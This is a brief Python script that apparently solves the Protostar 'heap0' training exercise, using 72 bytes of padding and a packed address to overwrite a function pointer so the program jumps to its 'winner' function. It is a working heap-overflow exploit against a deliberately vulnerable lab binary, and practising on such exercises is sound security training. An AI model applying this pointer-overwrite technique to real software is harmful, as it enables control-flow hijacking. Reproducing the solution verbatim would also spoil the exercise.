#!/usr/bin/python

import struct



#NOTE
#U HAVE THE USE IT AS AN ARGUMENT.
#/opt/protostar/bin/./heap0 $(~/heap0.py).


WINNER_FUNC = 0x08048464

pad = "A" * 72			#64 to fill the the struct name buffer
						#and 8 for the next chunk metadata.

exploit = ""
exploit += pad			#Add the pad to hit the pointer
exploit += struct.pack("I" , WINNER_FUNC)
						#Add the winner function pointer to replace it
						#the fp pointer place.

print exploit
